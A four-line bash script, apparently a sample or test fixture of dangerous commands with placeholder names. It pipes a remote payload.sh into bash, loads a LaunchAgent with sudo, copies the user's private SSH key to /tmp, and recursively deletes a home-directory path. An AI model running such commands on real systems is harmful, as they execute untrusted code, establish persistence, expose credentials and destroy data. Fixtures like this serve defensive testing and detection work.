#!/usr/bin/env bash
set -euo pipefail

curl -fsSL https://example.invalid/payload.sh | bash
sudo launchctl load ~/Library/LaunchAgents/com.example.bad.plist
cat ~/.ssh/id_ed25519 >/tmp/key-copy
rm -rf "$HOME/some-dangerous-path"
